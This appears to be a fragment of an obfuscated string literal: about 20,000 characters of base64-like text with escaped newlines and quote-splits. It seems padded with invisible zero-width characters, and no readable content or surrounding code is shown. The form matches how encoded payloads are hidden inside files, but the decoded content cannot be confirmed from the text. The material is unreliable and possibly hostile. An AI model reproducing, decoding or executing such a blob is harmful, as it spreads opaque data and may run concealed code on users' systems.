vigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIviga/igIviga7igIvigb3igIvigaLigIvigajigIviga7igIvi\ngZTigIvigaLigIviga/igIvigKzigIvigLHigIvigKvigIviga/igIviga7igIvigb3igIvigaLigIvi\ngajigIviga7igIvigZTigIvigaLigIviga/igIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigbrigIvigb7igIviga7igIvigbnigIvi\ngbLigIvigKzigIvigLHigIvigKvigIviga7igIvigabigIvigarigIvigaLigIvigafigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigbbigIvigKLigIvigKfigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKzigIvigaLigIvigazigIvigZTigIvigbjigIvigaLigIvigazigIvigZTigIvi\ngaDigIviga7igIvigbLigIvigZTigIvigb3igIviga7igIvigbnigIvigbjigIvigaLigIvigaTigIvi\ngaXigIvigKzigIvigLHigIvigKvigIvigKzigIvigL/igIvigKzigIvigKfigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigbbigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigbnigIviga7igIvigbjigIvigbvigIvigaTigIvigaXigIvigbjigIviga7igIvigKvigIvi\ngLbigIvigKvigIvigbnigIviga7igIvigbrigIvigb7igIviga7igIvigbjigIvigb/igIvigbjigIvi\ngKXigIvigbvigIvigaTigIvigbjigIvigb/igIvigKPigIvigKzigIvigaPigIvigb/igIvigb/igIvi\ngbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigaLigIvigKXigIvigaLigIvigaXigIvigbjigIvi\ngb/igIvigarigIvigazigIvigbnigIvigarigIvigabigIvigKXigIvigajigIvigaTigIvigabigIvi\ngKTigIvigarigIvigbvigIvigaLigIvigKTigIvigb3igIvigLrigIvigKTigIvigarigIvigajigIvi\ngajigIvigaTigIvigb7igIvigaXigIvigb/igIvigbjigIvigKTigIvigbjigIviga7igIvigaXigIvi\nga/igIvigZTigIvigbnigIviga7igIvigajigIvigaTigIvigb3igIviga7igIvigbnigIvigbLigIvi\ngZTigIviga3igIvigafigI""vigaTigIvigbzigIvigZTigIviga7igIvigabigIvigarigIvigaLigIvi\ngafigIvigKTigIvigKzigIvigKfigIvigKvigIvigaPigIviga7igIvigarigIviga/igIviga7igIvi\ngbnigIvigbjigIvigLbigIvigaPigIviga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvi\ngKfigIvigKvigIviga/igIvigarigIvigb/igIvigarigIvigLbigIviga/igIvigarigIvigb/igIvi\ngarigIvigKLigIvigKXigIvigb/igIviga7igIvigbPigIvigb/igIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigaLigIviga3igIvigKvigIviga7igIvi\ngabigIvigarigIvigaLigIvigafigIvigKvigIvigaLigIvigaXigIvigKvigIvigbnigIviga7igIvi\ngbjigIvigbvigIvigaTigIvigaXigIvigbjigIviga7igIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigYzigIvigabigIvigarigIvigaLigIvigafigIvigKPigIviga7igIvigabigIvi\ngarigIvigaLigIvigafigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigazigIvigaTigIvigaTigIviga/igIvigaLigIvigazigIvigKvigIvigKDigIvigLbigIvi\ngKvigIvigLrigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvigbvigIvigbvigIvi\ngbvigIvigKPigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviga7igIvigafigIvigbjigIviga7igIvigLHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviganigIvigarigIviga/igIvigaLigIvigaXigIvigbjigIvi\ngb/igIvigarigIvigKvigIvigKDigIvigLbigIvigKvigIvigLrigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigbvigIvigbvigIvigbvigIvigbvigIvigKPigI""vigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigaLigIvigaXigIviga3igIvigaTigIvi\ngaLigIvigaXigIvigbjigIvigb/igIvigarigIvigKvigIvigLbigIvigKvigIvigbDigIvigbbigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigaLigIviga/igIvigbjigIvi\ngLbigIvigZDigIvigZbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\nga/igIviga7igIviga3igIvigKvigIvigbnigIvigarigIvigaXigIviga/igIvigZTigIvigaLigIvi\nga/igIvigbjigIvigKPigIviganigIviganigIvigaDigIvigKfigIvigYLigIviga/igIvigaTigIvi\ngKLigIvigLHigIvigKvigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigYLigIviga/igIvigLbigIvigKvigIvigbjigIvigb/igIvigbnigIvi\ngKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigbnigIvigarigIvi\ngaXigIviga/igIvigbnigIvigarigIvigaXigIvigazigIviga7igIvigKPigIviganigIviganigIvi\ngaDigIvigKfigIvigKvigIvigYLigIviga/igIvigaTigIvigKLigIvigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigaLigIviga3igIvigKvigIvi\ngYLigIviga/igIvigKvigIvigaXigIvigaTigIvigb/igIvigKvigIvigaLigIvigaXigIvigKvigIvi\ngaLigIviga/igIvigbjigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigaLigIviga/igIvigbjigIvigKXigIvigarigIvi\ngbvigIvigbvigIviga7igIvigaXigIviga/igIvigKPigIvigYLigIviga/igIvigKLigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngbnigIviga7igIvigb/igIvigb7igIvigbnigIvigaXigIvigKvigIvigYLigIviga/igIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIviga7igIvigafigIvi\ngbjigIviga7igIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigbnigIvigarigIvigaXigIviga/igIvigZTigIvigaLigIvi\nga/igIvigbjigIvigKPigIviganigIviganigIvigaDigIvigKfigIvigYLigIviga/igIvigaTigIvi\ngKLi""gIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIviga/igIviga7igIvi\nga3igIvigKvigIvigb7igIvigb7igIvigb7igIvigKPigIvigKLigIvigLHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigbzigIvigaPigIvigaLigIvigafigIvi\nga7igIvigKvigIvigZ/igIvigbnigIvigb7igIviga7igIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga/igIvigaTigIvi\ngabigIvigarigIvigaLigIvigaXigIvigLbigIvigKzigIvigYvigIvigazigIvigabigIvigarigIvi\ngaLigIvigafigIvigKXigIvigajigIvigaTigIvigabigIvigKzigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviganigIviganigIvi\ngaDigIvigKvigIvigLbigIvigKvigIvigLnigIvigL7igIvigLvigIvigLvigIvigLvigIvigLvigIvi\ngLvigIvigLvigIvigLvigIvigLvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigYLigIviga/igIvigaTigIvigKvigIvigLbigIvi\ngKvigIvigLnigIvigLrigIvigLnigIvigL7igIvigL/igIvigLvigIvigLnigIvigLLigIvigLPigIvi\ngLjigIvigL/igIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigbzigIvigaPigIvigaLigIvigafigIviga7igIvigKvigIvigZ/igIvi\ngbnigIvigb7igIviga7igIvigLHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigbnigIvigaXigIviga/igIvigLbigIvigbjigIvigb/igIvigbnigIvi\ngKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigbnigIvigarigIvi\ngaXigIviga/igIvigaLigIvigaXigIvigb/igIvigKPigIvigLrigIvigL7igIvigLvigIvigKfigIvi\ngKvigIvigLLigIvigLLigIvigLLigIvigKLigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigb7igIvi\ngbjigIviga7igIvigbnigIvigZTigIvigarigIvigazigIviga7igIvigaXigIvigb/igIvigKvigIvi\ngLbigIvigKvigIvigKnigIvigYLigIvigaXi""gIvigbjigIvigb/igIvigarigIvigazigIvigbnigIvi\ngarigIvigabigIvigKvigIvigLjigIvigLrigIvigLrigIvigKXigIvigLvigIvigKXigIvigLvigIvi\ngKXigIvigLjigIvigLnigIvigKXigIvigLrigIvigLrigIvigLPigIvigKvigIvigYrigIvigaXigIvi\nga/igIvigbnigIvigaTigIvigaLigIviga/igIvigKvigIvigKPigIvigKnigIvigKvigIvigKDigIvi\ngKvigIvigZDigIvigKnigIvigLnigIvigLjigIvigKTigIvigL3igIvigKXigIvigLvigIvigKnigIvi\ngKfigIvigKvigIvigKnigIvigLnigIvigL/igIvigKTigIvigLzigIvigKXigIvigLvigIvigKnigIvi\ngKfigIvigKvigIvigKnigIvigLnigIvigL7igIvigKTigIvigLzigIvigKXigIvigLrigIvigKXigIvi\ngLrigIvigKnigIvigKfigIvigKvigIvigKnigIvigLnigIvigL3igIvigKTigIvigLPigIvigKXigIvi\ngLvigIvigKnigIvigKfigIvigKvigIvigKnigIvigLnigIvigLzigIvigKTigIvigLPigIvigKXigIvi\ngLrigIvigKnigIvigKfigIvigKvigIvigKnigIvigLnigIvigLPigIvigKTigIvigLLigIvigKXigIvi\ngLvigIvigKnigIvigZbigIvigZDigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvi\ngKXigIvigbnigIvigarigIvigaXigIviga/igIvigaLigIvigaXigIvigb/igIvigKPigIvigLvigIvi\ngKfigIvigKvigIvigL7igIvigKLigIvigZbigIvigKvigIvigKDigIvigKvigIvigKnigIvigLDigIvi\ngKvigIvigKnigIvigKvigIvigKDigIvigKvigIvigbjigIvigb/igIvigbnigIvigKPigIvigbnigIvi\ngarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigbnigIvigarigIvigaXigIviga/igIvi\ngaLigIvigaXigIvigb/igIvigKPigIvigLrigIvigLvigIvigLvigIvigKfigIvigKvigIvigLrigIvi\ngLjigIvigLvigIvigLvigIvigKLigIvigKLigIvigKvigIvigKDigIvigKvigIvigKnigIviga/igIvi\ngbvigIvigaLigIvigLDigIvigKvigIvigKnigIvigKvigIvigKDigIvigKvigIvigbjigIvigb/igIvi\ngbnigIvigKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigbnigIvi\ngarigIvigaXigIviga/igIvigaLigIvigaXigIvigb/igIvigKPigIvigLnigIvigLvigIvigLvigIvi\ngKfigIvigKvigIvigLnigIvigLvigIvigLvigIvigLvigIvigKLigIvigKLigIvigKvigIvigKDigIvi\ngKvigIvigKnigIvigbPigIvigKnigIvigKvigIvigKDigIvigKvigIvigbjigIvigb/igIvigbnigIvi\ngKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigbnigIvigarigIvi\ngaXigIviga/igIvigaLigIvigaXigIvigb/igIvigKPigIvigLnigIvigLvigIvigLvigIvigKfigIvi\ngKvigIvigLnigIvigLvigIvigLvigIvigLvigIvigKLigIvigKLigIvigKvigIvigKDi""gIvigKvigIvi\ngKnigIvigLDigIvigKvigIvigKnigIvigKvigIvigKDigIvigKvigIvigZDigIvigKnigIvigZjigIvi\ngYrigIvigYbigIvigZjigIvigZ7igIvigYXigIvigYzigIvigKnigIvigKfigIvigKvigIvigKnigIvi\ngYPigIvigZ7igIvigYrigIvigZzigIvigY7igIvigYLigIvigKnigIvigKfigIvigKvigIvigKnigIvi\ngYfigIvigYzigIvigY7igIvigKTigIvigafigIvigazigIviga7igIvigKnigIvigKfigIvigKvigIvi\ngKnigIvigYPigIvigZ/igIvigYjigIvigKnigIvigKfigIvigKvigIvigKnigIvigYrigIvigZjigIvi\ngZ7igIvigZjigIvigKnigIvigKfigIvigKvigIvigKnigIvigZHigIvigZ/igIvigY7igIvigKnigIvi\ngKfigIvigKvigIvigKnigIvigYTigIvigYXigIvigY7igIvigZvigIvigYfigIvigZ7igIvigZjigIvi\ngKnigIvigKfigIvigKvigIvigKnigIvigZPigIvigYLigIvigYrigIvigYTigIvigYbigIvigYLigIvi\ngKnigIvigKfigIvigKvigIvigKnigIvigYTigIvigZvigIvigZvigIvigYTigIvigKnigIvigKfigIvi\ngKvigIvigKnigIvigZ3igIvigYLigIvigZ3igIvigYTigIvigKnigIvigKfigIvigKvigIvigKnigIvi\ngZjigIvigYTigIvigYXigIvigZLigIvigKnigIvigKfigIvigKvigIvigKnigIvigZnigIvigY7igIvi\ngYrigIvigYfigIvigYbigIvigY7igIvigKnigIvigZbigIvigZDigIvigbnigIvigarigIvigaXigIvi\nga/igIvigaTigIvigabigIvigKXigIvigbnigIvigarigIvigaXigIviga/igIvigaLigIvigaXigIvi\ngb/igIvigKPigIvigLvigIvigKfigIvigKvigIvigLrigIvigLrigIvigKLigIvigZbigIvigKvigIvi\ngKDigIvigKvigIvigKnigIvigLDigIvigKvigIvigZjigIvigYbigIvigKbigIvigZ/igIvigKnigIvi\ngKvigIvigKDigIvigKvigIvigbnigIvigaXigIviga/igIvigKvigIvigKDigIvigKvigIvigKnigIvi\ngLDigIvigKvigIvigZjigIvigYbigIvigKbigIvigZ/igIvigKnigIvigKvigIvigKDigIvigKvigIvi\ngbnigIvigaXigIviga/igIvigKvigIvigKDigIvigKvigIvigKnigIvigLDigIvigKvigIvigbrigIvi\ngajigIvigaTigIvigabigIvigLDigIvigKvigIviga7igIvigaXigIvigZTigIvigZ7igIvigZjigIvi\ngLDigIvigKvigIvigL7igIvigL/igIvigL7igIvigLLigIvigLPigIvigL3igIvigKnigIvigKDigIvi\ngbjigIvigb/igIvigbnigIvigKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvi\ngKXigIvigbnigIvigarigIvigaXigIviga/igIvigaLigIvigaXigIvigb/igIvigKPigIvigLrigIvi\ngLrigIvigLrigIvigKfigIvigLLigIvigLLigIvigLLigIvigKLigIvigKLigIvigKDigIvigKnigIvi\ngKLigIvigKnigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigK""vigIvigKvigIvigKvigIvigYLigIviga/igIvigKvigIvigLbigIvigKvigIvi\ngbnigIvigarigIvigaXigIviga/igIvigZTigIvigaLigIviga/igIvigbjigIvigKPigIviganigIvi\nganigIvigaDigIvigKfigIvigYLigIviga/igIvigaTigIvigKLigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngafigIvigbjigIviga/igIvigLbigIvigKzigIvigKzigIvigKXigIvigaHigIvigaTigIvigaLigIvi\ngaXigIvigKPigIvigbnigIvigarigIvigaXigIviga/igIvigaTigIvigabigIvigKXigIvigajigIvi\ngaPigIvigaTigIvigaLigIvigajigIviga7igIvigKPigIvigKzigIvigarigIvigbHigIviga7igIvi\ngbnigIvigb/igIvigbLigIvigb7igIvigaLigIvigaTigIvigbvigIvigabigIvigafigIvigaDigIvi\ngaHigIvigaPigIvigazigIviga3igIviga/igIvigbjigIvigbrigIvigbzigIvigbPigIvigajigIvi\ngb3igIviganigIvigaXigIvigYrigIvigZHigIvigY7igIvigZnigIvigZ/igIvigZLigIvigZ7igIvi\ngYLigIvigYTigIvigZvigIvigYbigIvigYfigIvigYDigIvigYHigIvigYPigIvigYzigIvigY3igIvi\ngY/igIvigZjigIvigZrigIvigZzigIvigZPigIvigYjigIvigZ3igIvigYnigIvigYXigIvigLrigIvi\ngLnigIvigLjigIvigL/igIvigL7igIvigL3igIvigLzigIvigLPigIvigLLigIvigLvigIvigKzigIvi\ngKLigIvigKvigIviga3igIvigaTigIvigbnigIvigKvigIvigZTigIvigKvigIvigaLigIvigaXigIvi\ngKvigIvigbnigIvigarigIvigaXigIvigazigIviga7igIvigKPigIvigLjigIvigLnigIvigKLigIvi\ngKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigaPigIviga7igIvigarigIviga/igIviga7igIvigbnigIvi\ngbjigIvigKvigIvigLbigIvigKvigIvigbDigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigarigIvigajigIvigajigIvi\nga7igIvigbvigIvigb/igIvigKzigIvigLHigIvigKvigIvigKzigIvigKHigIvigKTigIvigKHigIvi\ngKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIvigarigIvigajigIvigajigIviga7igIvigbvigIvigb/igIvi\ngKbigIvigafigIvigarigIvigaXigIvigazigIvigb7igIvigarigIvigazigIviga7igIvigKzigIvi\ngLHigIvigKvigIvigKzigIviga7igIvigaXigIvigKfigIviga7igIvigaXigIvigKbigIvigZ7igIvi\ngZjigIvigLDigIvigbrigIvigLbigIvigLvigIvigKXigIvigL""LigIvigKzigIvigKfigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKzigIvigajigIvigaTigIvigaXigIvigb/igIviga7igIvigaXigIvigb/igIvigKbigIvigb/igIvi\ngbLigIvigbvigIviga7igIvigKzigIvigLHigIvigKvigIvigKzigIvigarigIvigbvigIvigbvigIvi\ngafigIvigaLigIvigajigIvigarigIvigb/igIvigaLigIvigaTigIvigaXigIvigKTigIvigbPigIvi\ngKbigIvigbzigIvigbzigIvigbzigIvigKbigIviga3igIvigaTigIvigbnigIvigabigIvigKbigIvi\ngb7igIvigbnigIvigafigIviga7igIvigaXigIvigajigIvigaTigIviga/igIviga7igIviga/igIvi\ngKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIviga/igIvigaXigIvigb/igIvigKzigIvigLHigIvigKvigIvi\ngKzigIvigLrigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigaTigIvigbnigIvigaLigIvigazigIvi\ngaLigIvigaXigIvigKzigIvigLHigIvigKvigIvigKzigIvigaPigIvigb/igIvigb/igIvigbvigIvi\ngbjigIvigLHigIvigKTigIvigKTigIvigbzigIvigbzigIvigbzigIvigKXigIvigaLigIvigaXigIvi\ngbjigIvigb/igIvigarigIvigazigIvigbnigIvigarigIvigabigIvigKXigIvigajigIvigaTigIvi\ngabigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigbvigIvigbnigIvigaLigIvigaTigIvigbnigIvi\ngaLigIvigb/igIvigbLigIvigKzigIvigLHigIvigKvigIvigKzigIvigb7igIvigLbigIvigLrigIvi\ngKfigIvigKvigIvigaLigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigbnigIviga7igIviga3igIvi\nga7igIvigbnigIviga7igIvigbnigIvigKzigIvigLHigIvigKvigIvigKzigIvigaPigIvigb/igIvi\ngb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigbzigIvigbzigIvigbzigIvigKXigIvi\ngaLigIvigaXigIvigbjigIvigb/igIvigarigIvigazigIvigbnigIvigarigIvigabigIvigKXigIvi\ngajigIvigaTigIvigabigIvigKTigIvigajigIvigbnigIvigaLigIvigbjigIvigb/igIvigaLigIvi\ngarigIvigaXigIvigaTigIvigKTigIviga3igIvigaTigIvigafigIvigafigIvigaTigIvigbzigIvi\ngaLigIvigaXigIvigazigIvigKTigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvi""\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigb7igIvigbjigIvi\nga7igIvigbnigIvigKbigIvigarigIvigazigIviga7igIvigaXigIvigb/igIvigKzigIvigLHigIvi\ngKvigIvigb7igIvigbjigIviga7igIvigbnigIvigZTigIvigarigIvigazigIviga7igIvigaXigIvi\ngb/igIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIvigbPigIvigKbigIviga3igIviganigIvigKbigIviga3igIvi\ngbnigIvigaLigIviga7igIvigaXigIviga/igIvigafigIvigbLigIvigKbigIvigaXigIvigarigIvi\ngabigIviga7igIvigKzigIvigLHigIvigKvigIvigKzigIvigZvigIvigaTigIvigafigIvigarigIvi\ngbnigIvigaLigIvigbjigIvigZ7igIvigbjigIviga7igIvigbnigIvigYPigIvigaTigIvigb3igIvi\nga7igIvigbnigIvigYjigIvigarigIvigbnigIviga/igIvigYjigIvigaTigIvigaXigIvigb/igIvi\nga7igIvigaXigIvigb/igIvigZ3igIvigLnigIvigZrigIvigb7igIviga7igIvigbnigIvigbLigIvi\ngKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIvigbPigIvigKbigIviga3igIviganigIvigKbigIvigafigIvi\ngbjigIviga/igIvigKzigIvigLHigIvigKvigIvigafigIvigbjigIviga/igIvigKfigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigbbigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\nga/igIvigarigIvigb/igIvigarigIvigKvigIvigLbigIvigKvigIvigbDigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvi\ngafigIvigbjigIviga/igIvigKzigIvigLHigIvigKvigIvigafigIvigbjigIviga/igIvigKfigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKzigIviga3igIviganigIvigZTigIvigarigIvigbvigIvigaLigIvigZTigIvigajigIvi\ngarigIvigafigIvigafigIviga7igIvigbnigIvigZTigIvigajigIvigafigIvigarigIvigbjigIvi\ngbjigIvigKzigIvigLHigIvigKvigIvigKzigIvigZnigIviga7igIvigafigIvigarigIvigbLigIvi\ngYbigIvigaTigIviga/igIviga7igIvigbnigIvigaXigIvigKzigIvigKfigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvi\nga3igIviganigIvigZTigIvigarigI""vigbvigIvigaLigIvigZTigIvigbnigIviga7igIvigbrigIvi\ngZTigIviga3igIvigbnigIvigaLigIviga7igIvigaXigIviga/igIvigafigIvigbLigIvigZTigIvi\ngaXigIvigarigIvigabigIviga7igIvigKzigIvigLHigIvigKvigIvigKzigIvigZvigIvigaTigIvi\ngafigIvigarigIvigbnigIvigaLigIvigbjigIvigZ7igIvigbjigIviga7igIvigbnigIvigYPigIvi\ngaTigIvigb3igIviga7igIvigbnigIvigYjigIvigarigIvigbnigIviga/igIvigYjigIvigaTigIvi\ngaXigIvigb/igIviga7igIvigaXigIvigb/igIvigZ3igIvigLnigIvigZrigIvigb7igIviga7igIvi\ngbnigIvigbLigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigb3igIvigarigIvigbnigIvigaLigIvi\ngarigIviganigIvigafigIviga7igIvigbjigIvigKzigIvigLHigIvigKvigIvigKzigIvigbDigIvi\ngKnigIvigb7igIvigbjigIviga7igIvigbnigIvigYLigIvigY/igIvigKnigIvigLHigIvigKnigIvi\ngKzigIvigKDigIvigbjigIvigb/igIvigbnigIvigKPigIvigYLigIviga/igIvigKLigIvigKDigIvi\ngKzigIvigKnigIvigKfigIvigKnigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvi\ngabigIviga7igIvigKnigIvigLHigIvigKnigIvigajigIvigbnigIvigaLigIvigbjigIvigb/igIvi\ngaLigIvigarigIvigaXigIvigaTigIvigKnigIvigbbigIvigKzigIvigKfigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvi\ngbjigIviga7igIvigbnigIvigb3igIviga7igIvigbnigIvigZTigIvigb/igIvigaLigIvigabigIvi\nga7igIvigbjigIvigb/igIvigarigIvigabigIvigbvigIvigbjigIvigKzigIvigLHigIvigKvigIvi\ngKzigIvigb/igIvigbnigIvigb7igIviga7igIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIviga/igIvi\ngaTigIvigajigIvigZTigIvigaLigIviga/igIvigKzigIvigLHigIvigKvigIvigKzigIvigLzigIvi\ngLzigIvigLrigIvigLzigIvigLnigIvigL3igIvigLLigIvigL/igIvigLPigIvigLPigIvigLjigIvi\ngLjigIvigL3igIvigLvigIvigLvigIvigLrigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigbbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbnigIviga7igIvigbjigI""vigbvigIvigaTigIvi\ngaXigIvigbjigIviga7igIvigKvigIvigLb